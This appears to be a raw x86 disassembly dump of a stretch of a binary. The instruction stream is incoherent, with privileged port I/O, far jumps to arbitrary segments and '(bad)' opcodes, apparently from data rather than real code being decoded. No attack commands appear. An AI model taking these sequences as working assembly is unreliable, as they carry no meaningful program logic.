  4256eb:	mov    ebp,0x230ca55c
  4256f0:	sbb    BYTE PTR [esi],bl
  4256f2:	xor    BYTE PTR [ebp-0x3e],dh
  4256f5:	mov    ah,0x6b
  4256f7:	pop    esp
  4256f8:	and    DWORD PTR [esi+0x7c0abda1],esp
  4256fe:	out    dx,eax
  4256ff:	push   eax
  425700:	pop    esi
  425701:	clc    
  425702:	shl    DWORD PTR [ecx+0x30],1
  425705:	adc    DWORD PTR fs:[ebp-0x5c8d6157],ebx
  42570c:	xchg   edx,eax
  42570d:	fwait
  42570e:	push   es
  42570f:	push   cs
  425710:	and    eax,0x706f8ebb
  425715:	sbb    BYTE PTR [ecx-0x5e],ch
  425718:	add    BYTE PTR [eax-0x62],bh
  42571b:	xchg   ebx,eax
  42571c:	popf   
  42571d:	in     al,0xe5
  42571f:	test   BYTE PTR [eax+0x53],dh
  425722:	out    0x8c,eax
  425724:	fiadd  WORD PTR [edx+0x32]
  425727:	out    dx,al
  425728:	jmp    0x4256c9
  42572a:	xor    bl,cl
  42572c:	jne    0x425748
  42572e:	pop    ecx
  42572f:	scas   al,BYTE PTR es:[edi]
  425730:	xor    ah,BYTE PTR [ebp+0x6b48f139]
  425736:	add    edi,DWORD PTR [ecx+0x6dd0f13f]
  42573c:	jo     0x4257ba
  42573e:	mov    esp,0xef01492e
  425743:	inc    esi
  425744:	sbb    ch,bh
  425746:	and    al,0x42
  425748:	cli    
  425749:	ja     0x42570c
  42574b:	mov    ah,BYTE PTR [edx]
  42574d:	fs push eax
  42574f:	ja     0x4257b5
  425751:	ss inc eax
  425753:	jp     0x4257c4
  425755:	fld    TBYTE PTR ds:[esi-0x1d]
  425759:	push   0x42
  42575b:	mov    DWORD PTR ds:0x944840ac,0xc804188f
  425765:	ins    BYTE PTR es:[edi],dx
  425766:	lea    esp,[esi]
  425768:	aaa    
  425769:	cmp    dl,bl
  42576b:	mov    ch,0x47
  42576d:	cwde   
  42576e:	or     BYTE PTR [eax-0x6842ced5],dl
  425774:	call   0xc232:0x8e61eacf
  42577b:	fisub  WORD PTR [ecx]
  42577d:	stos   DWORD PTR es:[edi],eax
  42577e:	mov    cs,esp
  425780:	ds and bl,cl
  425783:	dec    esp
  425784:	jmp    0x2dc0:0xcf290e98
  42578b:	or     DWORD PTR ds:0xe45ae625,esi
  425791:	jno    0x425717
  425793:	xchg   ecx,eax
  425794:	jecxz  0x425757
  425796:	ins    DWORD PTR es:[edi],dx
  425797:	jp     0x425759
  425799:	pop    ds
  42579a:	lods   al,BYTE PTR ds:[esi]
  42579b:	xor    eax,0xa9423c60
  4257a0:	adc    eax,0xba93
  4257a5:	add    BYTE PTR [eax],al
  4257a7:	add    BYTE PTR [eax],al
  4257a9:	add    BYTE PTR [edx+0x43],cl
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	xor    BYTE PTR [eax+0x60],cl
  4257bb:	in     eax,0x1
  4257bd:	add    BYTE PTR [ecx-0x6cfffffa],al
  4257c3:	hlt    
  4257c4:	std    
  4257c5:	(bad)  
  4257c6:	(bad)  
  4257c7:	mov    ebx,0x6bcd1b50
  4257cc:	je     0x42580a
  4257ce:	mov    WORD PTR [edi+0x7c8de200],?
  4257d4:	cwde   
  4257d5:	div    BYTE PTR [ebx-0xd62dc67]
  4257db:	ds jmp 0x2ff5f8a8
  4257e1:	retf   0x400d
  4257e4:	int3   
  4257e5:	out    dx,eax
  4257e6:	sub    eax,DWORD PTR [ebx*8-0x57a4b262]
  4257ed:	dec    ebp
  4257ee:	daa    
  4257ef:	sub    BYTE PTR [edx],ah
  4257f1:	pop    esp
  4257f2:	or     ch,ch
  4257f4:	mov    edi,0x9d6808c0
  4257f9:	rcl    esp,cl
  4257fb:	sbb    ah,bh
  4257fd:	xor    eax,0x8350ff69
  425802:	(bad)  
  425804:	cs jp  0x425819
  425807:	xchg   edx,eax
  425808:	sub    BYTE PTR [edx+0x9],bl
  42580b:	sub    al,0x3e
  42580d:	dec    ebx
  42580e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42580f:	fsub   DWORD PTR [ebp-0x5d291cb1]
  425815:	and    al,0x3b
  425817:	cmp    edx,DWORD PTR [edi-0x26beadc7]
  42581d:	xchg   ebx,eax
  42581e:	sar    BYTE PTR [esi+0x3c],cl
  425821:	lods   al,BYTE PTR ds:[si]
  425823:	jmp    0x42584e
  425825:	mov    WORD PTR [ecx+0x26c83514],fs
  42582b:	mov    ecx,0x6d305740
  425830:	int    0x64
  425832:	or     ebx,DWORD PTR ss:[ecx]
  425835:	leave  
  425836:	push   ebp
  425837:	call   0xbebd:0x26dec7b9
  42583e:	and    bl,BYTE PTR [ecx+ecx*8]
  425841:	adc    BYTE PTR [ecx-0x7f],bh
  425844:	scas   eax,DWORD PTR es:[edi]
  425845:	cld    
  425846:	push   eax
  425847:	mov    ah,dh
  425849:	fimul  DWORD PTR [edi-0x4db5b465]
  42584f:	xor    BYTE PTR [edx],ah
  425851:	das    
  425852:	push   ds
  425853:	adc    eax,0x3e25c5f2
  425858:	mov    esi,0x13e31855
  42585d:	lods   eax,DWORD PTR ds:[esi]
  42585e:	jmp    0x29bdee90
  425863:	sti    
  425864:	jae    0x4257ff
  425866:	jns    0x425836
  425868:	(bad)  [ecx+0x2d3cb9b8]
  42586e:	or     al,0x23
  425870:	fisub  DWORD PTR [eax]
  425872:	jge    0x42581b
  425874:	and    DWORD PTR [esi-0x15313b42],edi
  42587a:	add    ebp,DWORD PTR [edi]
  42587c:	aas    
  42587d:	cmp    ah,bh
  42587f:	sbb    BYTE PTR [ecx+0x585422f0],dh
  425885:	in     eax,dx
  425886:	fimul  DWORD PTR [ebp+0x52]
  425889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42588a:	ins    DWORD PTR es:[edi],dx
  42588b:	jb     0x4258ca
  42588d:	fadd   DWORD PTR [ecx-0x52723a6c]
  425893:	and    bl,bh
  425895:	aaa    
  425896:	les    edx,FWORD PTR [eax-0x159a7574]
  42589c:	sbb    edx,esp
  42589e:	lock lahf 
  4258a0:	std    
  4258a1:	mov    dh,bh
  4258a3:	mov    ecx,0x9e8f9836
  4258a8:	sub    DWORD PTR [edx],ebx
  4258aa:	dec    esi
  4258ab:	pop    ebp
  4258ac:	rcr    DWORD PTR [esi+0x4c],1
  4258af:	xor    ch,BYTE PTR [ecx+0x6]
  4258b2:	(bad)  
  4258b3:	out    0x66,al
  4258b5:	imul   ebp,DWORD PTR [ebx+0x3bd0a4e0],0x11
  4258bc:	jb     0x425858
  4258be:	ficom  WORD PTR [esi+0x48]
  4258c1:	stc    
  4258c2:	imul   esp,DWORD PTR [esp+edx*2+0x3f10d376],0x343703e7
  4258cd:	mov    edi,0x4deb47b2
  4258d2:	sub    dh,BYTE PTR [esi+0x53]
  4258d5:	add    al,0xdc
  4258d7:	out    0x3e,eax
  4258d9:	jns    0x4258ee
  4258db:	out    0x59,eax
  4258dd:	es mov ebx,0x74a2ebda
  4258e3:	mov    DWORD PTR [ebp-0x4bd01f23],esp
  4258e9:	push   eax
  4258ea:	mov    ecx,gs
  4258ec:	mov    ah,0x26
  4258ee:	fwait
  4258ef:	clc    
  4258f0:	mov    eax,0xf7d0397
  4258f5:	push   0x79a3de79
  4258fa:	call   0x496c246a
  4258ff:	dec    BYTE PTR [edi+eiz*1-0x4c]
  425903:	adc    eax,0x48d3e95b
  425908:	jbe    0x4258bb
  42590a:	fsincos 
  42590c:	repz mov esp,0xfd784aae
  425912:	test   al,0x74
  425914:	sbb    DWORD PTR ds:0x29646c07,edx
  42591a:	and    dh,BYTE PTR ds:0xc597069e
  425920:	inc    BYTE PTR [ebx+0x3c]
  425923:	inc    edi
  425924:	pop    esp
  425925:	cli    
  425926:	shl    DWORD PTR [esi],cl
  425928:	push   ds
  425929:	inc    ebx
  42592a:	ins    BYTE PTR es:[edi],dx
  42592b:	or     al,0xbe
  42592d:	jle    0x42596b
  42592f:	int    0xf
  425931:	in     al,dx
  425932:	push   ecx
  425933:	ins    DWORD PTR es:[edi],dx
  425934:	cmp    BYTE PTR [ebp+0x2f],bl
  425937:	pop    edi
  425938:	repnz dec ebp
  42593a:	cmp    al,0xe6
  42593c:	cmp    eax,DWORD PTR [ecx+eiz*8+0x29b9aa74]
  425943:	je     0x425980
  425945:	fdiv   DWORD PTR [esi+0x5]
  425948:	stc    
  425949:	push   ecx
  42594a:	fldenv [edx+0x39]
  42594d:	sub    al,cl
  42594f:	in     al,dx
  425950:	inc    esp
  425951:	ss jbe 0x4259a0
  425954:	sti    
  425955:	nop
  425956:	jmp    0x425922
  425958:	outs   dx,DWORD PTR ds:[esi]
  425959:	add    al,0x2d
  42595b:	mov    ch,0x2e
  42595d:	jbe    0x425933
  42595f:	addr16 je 0x4259b2
  425962:	and    bl,BYTE PTR es:[ecx]
  425965:	repnz xchg edi,eax
  425967:	and    DWORD PTR [ecx+eax*8-0x22c4c622],ecx
  42596e:	lock retf 0xcf72
  425972:	mov    ebp,0xbf7fe075
  425977:	xor    DWORD PTR [esi],0x7092db9f
  42597d:	xchg   esi,eax
  42597e:	dec    edx
  42597f:	xchg   ebp,eax
  425980:	mov    WORD PTR [esi-0x3165c238],fs
  425986:	fcmovnbe st,st(5)
  425988:	aad    0x70
  42598a:	in     eax,0x9f
  42598c:	push   ds
  42598d:	dec    ebx
  42598e:	sub    eax,DWORD PTR [ebp-0x24]
  425991:	addr16 push ss
  425993:	shl    BYTE PTR [edi-0x5b],0xe9
  425997:	pusha  
  425998:	fucom  st(7)
  42599a:	lods   al,BYTE PTR ds:[esi]
  42599b:	mov    WORD PTR [eax+0x351f5ae8],es
  4259a1:	sub    eax,0x7bd55d89
  4259a6:	jmp    0x3acaf563
  4259ab:	(bad)  
  4259ac:	out    0x3d,al
  4259ae:	ficom  DWORD PTR [eax-0x11f39d4d]
  4259b4:	stos   BYTE PTR es:[edi],al
  4259b5:	ja     0x425988
  4259b7:	sub    al,0x6a
  4259b9:	adc    ebp,DWORD PTR [esp+edx*8]
  4259bc:	cmc    
  4259bd:	into   
  4259be:	dec    esi
  4259bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259c0:	std    
  4259c1:	popa   
  4259c2:	rcl    BYTE PTR [esi],cl
  4259c4:	adc    bl,BYTE PTR [esi]
  4259c6:	scas   eax,DWORD PTR es:[edi]
  4259c7:	pop    ds
  4259c8:	rcr    BYTE PTR [edx+0x18],cl
  4259cb:	pop    ebp
  4259cc:	leave  
  4259cd:	adc    esp,DWORD PTR [esi+0x55310343]
  4259d3:	jo     0x42598c
  4259d5:	mov    ecx,0x8e9b415d
  4259da:	pop    ecx
  4259db:	mov    ch,0x68
  4259dd:	stc    
  4259de:	std    
  4259df:	in     eax,0x9b
  4259e1:	cmp    al,0x9b
  4259e3:	sbb    bh,ah
  4259e5:	stos   DWORD PTR es:[edi],eax
  4259e6:	je     0x425991
  4259e8:	pop    ebx
  4259e9:	sar    DWORD PTR [ecx],0xca
  4259ec:	(bad)  
  4259ee:	sbb    BYTE PTR ds:0xbf084add,bh
  4259f4:	or     eax,0x374a3228
  4259f9:	nop
  4259fa:	and    eax,0xccdac7f6
  4259ff:	jle    0x4259ff
  425a01:	mov    al,BYTE PTR [esp+ebp*1+0xc8688f5]
  425a08:	fmul   st,st(4)
  425a0a:	jecxz  0x425a01
  425a0c:	sbb    ah,BYTE PTR cs:[edi+0x1ac4a03d]
  425a13:	cmp    BYTE PTR [eax+0x62cf26a3],bh
  425a19:	outs   dx,DWORD PTR ds:[esi]
  425a1a:	shr    DWORD PTR [esi-0x73],0x64
  425a1e:	(bad)  
  425a1f:	xlat   BYTE PTR ds:[ebx]
  425a20:	sbb    bl,ch
  425a22:	jecxz  0x4259d0
  425a24:	mov    esp,0x39a2531e
  425a29:	jl     0x4259ae
  425a2b:	leave  
  425a2c:	mov    esp,0xb026499b
  425a31:	or     eax,0x8082ffbd
  425a36:	pop    eax
  425a37:	les    ebp,FWORD PTR [ebp+ebp*1-0x17c0f838]
  425a3e:	cmp    ch,BYTE PTR [ebx]
  425a40:	out    dx,al
  425a41:	ss fwait
  425a43:	and    al,0x22
  425a45:	xor    al,0x27
  425a47:	aad    0x86
  425a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a4a:	dec    ebp
  425a4b:	sbb    eax,0xde142725
  425a50:	jbe    0x425a12
  425a52:	cmp    eax,DWORD PTR [ebp+0x686bb6dc]
  425a58:	test   eax,0x9b60cf62
  425a5d:	dec    edi
  425a5e:	pop    ecx
  425a5f:	mov    ecx,0x1022fd
  425a64:	jmp    0xb46b0bf7
  425a69:	sub    ah,BYTE PTR [ecx-0x21]
  425a6c:	xchg   edi,eax
  425a6d:	dec    esi
  425a6e:	mov    eax,ds:0xba87af9c
  425a73:	mov    BYTE PTR [esi],al
  425a75:	push   eax
  425a76:	dec    ebp
  425a77:	jl     0x425ab3
  425a79:	dec    DWORD PTR [eax-0x116368d9]
  425a7f:	mov    ebp,DWORD PTR [edi-0x2a110da5]
  425a85:	shl    BYTE PTR [ebp-0x32],1
  425a88:	stos   DWORD PTR es:[edi],eax
  425a89:	jmp    0x1d21:0x9effdb22
  425a90:	sub    DWORD PTR [esi-0x73],ebx
  425a93:	mov    DWORD PTR [ecx+0x38162b7],edi
  425a99:	fwait
  425a9a:	std    
  425a9b:	mov    bh,0xef
  425a9d:	mov    esp,0xf789e384
  425aa2:	fwait
  425aa3:	arpl   WORD PTR [edi-0x2],bp
  425aa6:	dec    ebp
  425aa7:	jae    0x425b1d
  425aa9:	jg     0x425aaf
  425aab:	dec    ebp
  425aac:	add    al,0x22
  425aae:	cmc    
  425aaf:	adc    al,0xc7
  425ab1:	sub    bh,BYTE PTR fs:[ebx]
  425ab4:	sbb    BYTE PTR [edi-0x79d7cc0e],bl
  425aba:	mov    dh,0xc3
  425abc:	(bad)  
  425abe:	pop    ds
  425abf:	test   BYTE PTR [edi-0xc],dl
  425ac2:	rcr    DWORD PTR [ecx],cl
  425ac4:	scas   al,BYTE PTR es:[edi]
  425ac5:	sub    eax,0xda15c8c0
  425aca:	and    BYTE PTR [eax],0x13
  425acd:	test   al,0x74
  425acf:	lods   al,BYTE PTR ds:[esi]
  425ad0:	sahf   
  425ad1:	ja     0x425b11
  425ad3:	popa   
  425ad4:	aaa    
  425ad5:	lea    ebx,[ebx]
  425ad7:	mov    ds:0x46c33551,eax
  425adc:	xchg   DWORD PTR ds:0x5e2493dc,ebx
  425ae2:	add    eax,0x4554d2b
  425ae7:	cmp    DWORD PTR [esp+ebx*2],esp
  425aea:	iret   
  425aeb:	jno    0x425adb
  425aed:	adc    esp,ecx
  425aef:	mov    ecx,0x6546abe6
  425af4:	sub    al,0x7b
  425af6:	cdq    
  425af7:	sbb    eax,0x1879ba8c
  425afc:	cmc    
  425afd:	arpl   WORD PTR [edx-0x72a39607],cx
  425b03:	clc    
  425b04:	or     ah,BYTE PTR [ecx]
  425b06:	xor    BYTE PTR [edx+0x29],0x95
  425b0a:	xchg   ebp,eax
  425b0b:	push   0xe4837f67
  425b10:	mov    edx,0xc19da510
  425b15:	je     0x425b72
  425b17:	addr16 cs and dl,ah
  425b1b:	dec    ebp
  425b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b1d:	les    ebp,FWORD PTR [ecx-0xe15e084]
  425b23:	adc    bl,BYTE PTR [ebx-0x4ac3da21]
  425b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b2a:	mov    esi,0xc92fceae
  425b2f:	les    edi,FWORD PTR [ecx]
  425b31:	dec    edi
  425b32:	retf   
  425b33:	pop    es
  425b34:	mov    cl,BYTE PTR [ecx]
  425b36:	mov    ebp,0x365a3947
  425b3b:	xor    ah,BYTE PTR [edx+0x3a]
  425b3e:	sub    al,0x57
  425b40:	mov    ah,0xa7
  425b42:	add    ebp,DWORD PTR [ebx+edi*8+0x3b9b0c93]
  425b49:	ror    edi,0x22
  425b4c:	fimul  WORD PTR [ebp+0x5f486bd3]
  425b52:	mov    dl,0xf8
  425b54:	sahf   
  425b55:	adc    edx,DWORD PTR [ecx]
  425b57:	mov    edx,0x4ebcc530
  425b5c:	fcomi  st,st(0)
  425b5e:	sub    esi,DWORD PTR ds:0xd6178ee8
  425b64:	jmp    0x5e3e:0xbd6e3526
  425b6b:	(bad)  
  425b6c:	jecxz  0x425beb
  425b6e:	jmp    0x425af1
  425b70:	test   al,0x99
  425b72:	push   ebx
  425b73:	inc    esi
  425b74:	mov    ecx,0x4ed633d3
  425b79:	inc    ebp
  425b7a:	cmp    BYTE PTR [edi],cl
  425b7c:	jmp    0xde50:0x26517db6
  425b83:	pop    edx
  425b84:	fidiv  WORD PTR [ebx-0x6b]
  425b87:	int3   
  425b88:	popf   
  425b89:	hlt    
  425b8a:	sbb    BYTE PTR [edx+0x65],0x28
  425b8e:	fsubp  st(0),st
  425b90:	mov    cl,BYTE PTR [ecx+esi*1-0xf96ec5b]
  425b97:	push   es
  425b98:	je     0x425b1c
  425b9a:	addr16 pop ds
  425b9c:	jno    0x425bd4
  425b9e:	sub    DWORD PTR [edi+0x5868f41c],0x50
  425ba5:	cdq    
  425ba6:	pop    esi
  425ba7:	xchg   bl,bh
  425ba9:	push   0x8e8dfbf8
  425bae:	loopne 0x425b7e
  425bb0:	or     BYTE PTR [esi],ch
  425bb2:	lods   eax,DWORD PTR ds:[esi]
  425bb3:	dec    ebp
  425bb4:	sub    cl,BYTE PTR [ebx-0x20a9c00d]
  425bba:	out    dx,eax
  425bbb:	pop    esi
  425bbc:	add    DWORD PTR [edi],ebp
  425bbe:	aas    
  425bbf:	mov    eax,ds:0xb4c5fd78
  425bc4:	mov    al,ds:0x8cb8c137
  425bc9:	dec    edx
  425bca:	pusha  
  425bcb:	mov    cs,WORD PTR [edi-0x2ec7b81c]
  425bd1:	fnstenv [ecx+0x74]
  425bd4:	push   ebp
  425bd5:	mov    esi,0x90243adf
  425bda:	push   edi
  425bdb:	cmp    BYTE PTR es:[ebp+0xc467502],bl
  425be2:	ror    eax,1
  425be4:	int    0x98
  425be6:	fistp  DWORD PTR [ebx]
  425be8:	fidivr DWORD PTR [ecx+ecx*4-0x7]
  425bec:	add    ebp,DWORD PTR [ebx]
  425bee:	sub    BYTE PTR [ebx-0x4e41962e],ah
  425bf4:	cmp    dh,BYTE PTR [esi]
  425bf6:	push   ebp
  425bf7:	test   BYTE PTR [ebx-0x42],ah
  425bfa:	xchg   ebp,eax
  425bfb:	je     0x425c73
  425bfd:	dec    esp
  425bfe:	fldcw  WORD PTR ds:0xc45fa277
  425c04:	inc    esi
  425c05:	jge    0x425bd4
  425c07:	pop    es
  425c08:	or     ah,BYTE PTR [eax-0x28]
  425c0b:	scas   eax,DWORD PTR es:[edi]
  425c0c:	pop    ecx
  425c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c0e:	sbb    BYTE PTR ds:0x93105d63,bl
  425c14:	into   
  425c15:	popa   
  425c16:	xchg   edx,eax
  425c17:	jp     0x425c97
  425c19:	je     0x425be7
  425c1b:	(bad)  
  425c1d:	push   ss
  425c1e:	push   0x7b
  425c20:	xchg   ecx,eax
  425c21:	shl    BYTE PTR [edi+ebx*1-0x77],1
  425c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c26:	lds    ebx,FWORD PTR [esi-0x56]
  425c29:	push   edi
  425c2a:	ins    BYTE PTR es:[edi],dx
  425c2b:	jmp    FWORD PTR [esp+ecx*8+0x25929f04]
  425c32:	mov    ebx,0x9c5eb33e
  425c37:	clc    
  425c38:	in     eax,0x29
  425c3a:	xchg   esi,eax
  425c3b:	mov    al,ds:0x458b4a92
  425c40:	std    
  425c41:	jge    0x425c17
  425c43:	push   ebp
  425c44:	jmp    0xc0f:0x5ec8cdea
  425c4b:	dec    esp
  425c4c:	dec    esp
  425c4d:	dec    ebx
  425c4e:	mov    cl,0x64
  425c50:	sbb    ebx,DWORD PTR [eax]
  425c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c53:	aam    0x85
  425c55:	repz imul eax,DWORD PTR [ebx-0x8],0xffffffe5
  425c5a:	adc    ebx,ecx
  425c5c:	adc    eax,0x69d68227
  425c61:	and    al,0xee
  425c63:	cmc    
  425c64:	and    DWORD PTR [esi-0x3],ebp
  425c67:	jno    0x425c48
  425c69:	mov    edi,0x9d32cb97
  425c6e:	push   eax
  425c6f:	mov    edi,DWORD PTR [esi-0x23]
  425c72:	leave  
  425c73:	popa   
  425c74:	ins    DWORD PTR es:[edi],dx
  425c75:	xor    dh,BYTE PTR [edx-0x14b0d0ce]
  425c7b:	in     eax,dx
  425c7c:	nop
  425c7d:	outs   dx,BYTE PTR ds:[esi]
  425c7e:	test   eax,0x5e16db02
  425c83:	ror    DWORD PTR [edi-0x5d2deab4],cl
  425c89:	jp     0x425c14
  425c8b:	mov    ch,0xb7
  425c8d:	ret    0x591a
  425c90:	xchg   esp,eax
  425c91:	mov    WORD PTR [esi],?
  425c93:	std    
  425c94:	imul   edi,esi,0x3c
  425c97:	fstp   QWORD PTR [ecx+0x6e]
  425c9a:	xchg   BYTE PTR [ebx+0x6a],cl
  425c9d:	adc    DWORD PTR [esi-0x63],ebx
  425ca0:	pop    ebp
  425ca1:	stc    
  425ca2:	retf   0x390b
  425ca5:	or     eax,0xab1ed0bd
  425caa:	push   ebx
  425cab:	and    dl,BYTE PTR [ecx+0x5]
  425cae:	and    DWORD PTR [ecx],esi
  425cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cb1:	mov    cl,0x37
  425cb3:	adc    eax,edi
  425cb5:	and    al,0x5e
  425cb7:	cld    
  425cb8:	xlat   BYTE PTR ds:[ebx]
  425cb9:	retf   
  425cba:	mov    ds:0xcdda67d3,eax
  425cbf:	rcl    DWORD PTR [edx+0x52fc88c0],0xba
  425cc6:	xor    al,0x4
  425cc8:	or     al,0x9a
  425cca:	out    dx,eax
  425ccb:	sub    eax,0xaaedf44c
  425cd0:	ss loop 0x425d3a
  425cd3:	test   al,0x4
  425cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cd6:	ins    DWORD PTR es:[edi],dx
  425cd7:	hlt    
  425cd8:	sbb    ecx,DWORD PTR [eax]
  425cda:	shl    DWORD PTR [esi],1
  425cdc:	shl    DWORD PTR [esi],0xfc
  425cdf:	mov    ebp,0x91136aac
  425ce4:	mov    esi,ebx
  425ce6:	cmp    bh,ch
  425ce8:	loope  0x425cfd
  425cea:	jns    0x425d54
  425cec:	add    dh,bh
  425cee:	popf   
  425cef:	mov    bh,0xdf
  425cf1:	push   DWORD PTR [eax-0x6d]
  425cf4:	inc    ecx
  425cf5:	jae    0x425d13
  425cf7:	(bad)  
  425cf9:	add    BYTE PTR [eax-0x80],ah
  425cfc:	(bad)  
  425cfd:	icebp  
  425cfe:	es pop ecx
  425d00:	dec    eax
  425d01:	lock or bh,BYTE PTR [eax+0x66514c53]
  425d08:	xchg   al,ah
  425d0a:	add    ebx,DWORD PTR ds:0x9f56d44d
  425d10:	jae    0x425cdc
  425d12:	(bad)  
  425d13:	sbb    cl,BYTE PTR [edi-0x451b4350]
  425d19:	sub    DWORD PTR [edi],edx
  425d1b:	mov    edi,0xe4e9beff
  425d20:	(bad)  
  425d23:	dec    BYTE PTR ss:[eax]
  425d26:	mov    fs,ebp
  425d28:	adc    dh,dl
  425d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d2b:	in     al,dx
  425d2c:	mov    ecx,0x13e2a734
  425d31:	dec    ebx
  425d32:	sub    cl,bl
  425d34:	xor    eax,edx
  425d36:	mov    ebp,0xd17f2ff2
  425d3b:	mov    ebp,0x9f0a776f
  425d40:	fldenv [ebx+0x21f73d60]
  425d46:	sub    al,BYTE PTR [ebx+esi*1-0x62]
  425d4a:	fs jo  0x425d41
  425d4d:	and    al,0x55
  425d4f:	jp     0x425d91
  425d51:	mov    edi,0x4223d39c
  425d56:	jle    0x425d13
  425d58:	data16 sub al,0x17
  425d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d5c:	fimul  WORD PTR [ebx-0x32484a11]
  425d62:	mov    ecx,0xaf6ecfe3
  425d67:	and    cl,BYTE PTR [ebx]
  425d69:	mov    ah,0xae
  425d6b:	dec    esi
  425d6c:	(bad)  
  425d6d:	xchg   esi,eax
  425d6e:	dec    ebp
  425d6f:	dec    eax
  425d70:	push   ss
  425d71:	mov    ch,0xbb
  425d73:	sbb    BYTE PTR [edx+0xe3899f2],0x43
  425d7a:	das    
  425d7b:	test   eax,0x1b656fa4
  425d80:	ja     0x425d8f
  425d82:	loope  0x425dc9
  425d84:	dec    ebx
  425d85:	jg     0x425d12
  425d87:	cdq    
  425d88:	hlt    
  425d89:	mov    ds:0x211b265c,al
  425d8e:	inc    esp
  425d8f:	push   0x95665d54
  425d94:	push   edx
  425d95:	lahf   
  425d96:	shr    DWORD PTR [esi-0x1],0x2d
  425d9a:	and    bh,BYTE PTR [eax+0x40]
  425d9d:	sbb    bl,BYTE PTR [eax+0x16]
  425da0:	(bad)
  425da4:	cmp    al,0x46
  425da6:	ret    
  425da7:	mov    bh,0x1b
  425da9:	xor    eax,0x81c0a42b
  425dae:	inc    esp
  425daf:	mov    eax,0xb3ebc4fc
  425db4:	mov    edx,0x96033ab7
  425db9:	pop    eax
  425dba:	ret    0x2dc
  425dbd:	dec    ebp
  425dbe:	xor    DWORD PTR [edx],0x47844a09
  425dc4:	pop    ecx
  425dc5:	cmp    al,0xcd
  425dc7:	adc    BYTE PTR [ecx+0x7f],al
  425dca:	out    dx,al
  425dcb:	sti    
  425dcc:	(bad)  
  425dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dce:	sar    DWORD PTR [edi],0x55
  425dd1:	sbb    DWORD PTR [eax+0x71],0xc88462a0
  425dd8:	fiadd  DWORD PTR [esi-0x3f6e2a0d]
  425dde:	into   
  425ddf:	arpl   dx,cx
  425de1:	xchg   ebp,eax
  425de2:	dec    edi
  425de3:	jle    0x425df0
  425de5:	in     eax,dx
  425de6:	and    DWORD PTR [ecx+0x55],edi
  425de9:	mov    esi,0xb09e30e3
  425dee:	(bad)  
  425def:	lea    esi,[esi+0x312d5f5]
  425df5:	icebp  
  425df6:	adc    eax,0xf98cfd9b
  425dfb:	popf   
  425dfc:	add    bh,bh
  425dfe:	inc    edx
  425dff:	pop    ecx
  425e00:	mov    eax,0x1d1d385
  425e05:	push   ebx
  425e06:	popa   
  425e07:	je     0x425d8f
  425e09:	sub    dl,dl
  425e0b:	mov    edx,ds
  425e0d:	xor    BYTE PTR [edx+0xf],ah
  425e10:	scas   al,BYTE PTR es:[edi]
  425e11:	pop    es
  425e12:	xchg   ebp,eax
  425e13:	jno    0x425df8
  425e15:	push   edx
  425e16:	adc    al,0xb8
  425e18:	or     DWORD PTR [ebx],eax
  425e1a:	das    
  425e1b:	dec    ebp
  425e1c:	pop    ecx
  425e1d:	cmp    esi,ebp
  425e1f:	xchg   BYTE PTR [eax],al
  425e21:	add    bl,dl
  425e23:	xor    BYTE PTR [edi+esi*1+0x3cf0bfc9],bl
  425e2a:	and    ecx,ebp
  425e2c:	push   ebx
  425e2d:	sahf   
  425e2e:	popa   
  425e2f:	call   0x30c0e572
  425e34:	mov    ds:0x4c8fac30,al
  425e39:	jb     0x425dd1
  425e3b:	cmp    eax,DWORD PTR [esi-0x24]
  425e3e:	imul   ebp,DWORD PTR [ebx-0x24],0x2a5c
  425e45:	add    BYTE PTR [eax],al
  425e47:	add    BYTE PTR [eax],al
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x3
  425e57:	scas   eax,DWORD PTR es:[edi]
  425e58:	call   0x8100:0x1ebe1b5
  425e5f:	push   es
  425e60:	add    BYTE PTR [eax],al
  425e62:	pop    es
  425e63:	arpl   WORD PTR [esi-0x27],ax
  425e66:	xlat   BYTE PTR ds:[ebx]
  425e67:	lods   eax,DWORD PTR ds:[esi]
  425e68:	das    
  425e69:	or     eax,0x33c2d2cc
  425e6e:	adc    BYTE PTR ds:0x5132741a,dh
  425e74:	out    dx,eax
  425e75:	loope  0x425ecf
  425e77:	outs   dx,DWORD PTR ds:[esi]
  425e78:	mov    dl,0x35
  425e7a:	mov    al,0x80
  425e7c:	ret    
  425e7d:	and    eax,0xc10e5a00
  425e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e83:	or     DWORD PTR [esi+ebx*4-0x5429d49f],esi
  425e8a:	out    dx,al
  425e8b:	jne    0x425ecf
  425e8d:	addr16 inc edi
  425e8f:	stc    
  425e90:	loop   0x425ed6
  425e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e93:	dec    esp
  425e94:	push   cs
  425e95:	scas   al,BYTE PTR es:[edi]
  425e96:	retf   
  425e97:	aad    0x59
  425e99:	rcr    DWORD PTR [ebx],cl
  425e9b:	xchg   esp,eax
  425e9c:	outs   dx,BYTE PTR ds:[esi]
  425e9d:	test   BYTE PTR [eax],ah
  425e9f:	int    0x56
  425ea1:	jae    0x425e63
  425ea3:	mov    WORD PTR [eax+0x0],ss
  425ea6:	ds cld 
  425ea8:	cli    
  425ea9:	aaa    
